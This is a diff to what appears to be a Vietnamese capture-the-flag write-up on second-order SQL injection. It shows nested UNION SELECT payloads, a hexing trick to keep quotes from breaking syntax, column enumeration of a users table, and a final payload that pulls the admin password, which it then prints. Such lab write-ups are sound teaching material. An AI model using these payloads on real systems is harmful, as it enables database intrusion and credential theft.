@@ -31,7 +31,7 @@ Tức là , backend có thể là
 ```sql
 SELECT request_login from public where search = 'admin'
 
-Giả sử câu lệnh đầu tiên trả về admin luôn đi
+Giả sử câu lệnh đầu tiên sẽ trả về admin 
 
 
 Rồi câu truy vấn thứ 2 sẽ có form như sau:
@@ -52,11 +52,11 @@ Dạng dạng như thế . Vậy thì ở câu truy vấn thứ nhất chúng ta
 ```sql
 ' union select 1,password from users --
 ```
-cái này . vậy thì câu truy vấn phải là 
+cái này . vậy thì câu truy vấn thứ nhất phải là 
 ```sql
-SELECT found_id , email from user where request_login =  '' union select 'union select 1,password from users -- -' -- -
+SELECT request_login from user where search =  '' union select 'union select 1,password from users -- -' -- -
 ```
-Nhưng chúng ta phải hex nó ra để tránh việc dấu nháy làm sai cú pháp 
+Nhưng chúng ta phải hex cái đoạn `union .... user -- -` ở cuối cùng đó ra để tránh việc dấu nháy làm sai cú pháp 
 
 Rồi oke vào bài làm 
 
@@ -98,10 +98,19 @@ hex nó ra
 ```
 Kết quả là: cột email,id,login,password
 
+<img width="1885" height="484" alt="chèn 1" src="https://github.com/user-attachments/assets/59ab1750-d02e-43fe-bf8b-820fce8ad629" />
 
-Cuối cùng là 
+
+Cuối cùng là lấy password admin
 ```sql
 ' union select '' union select password,login from users -- -' -- -
+```
+
+<img width="1864" height="487" alt="chèn 2" src="https://github.com/user-attachments/assets/90e29b45-dbfb-45d5-8298-647806509559" />
+
+Chúng ta có password admin
+```
+password:qs89QdAs8A
 ```
 
 Chúng ta done bài này nhe!!
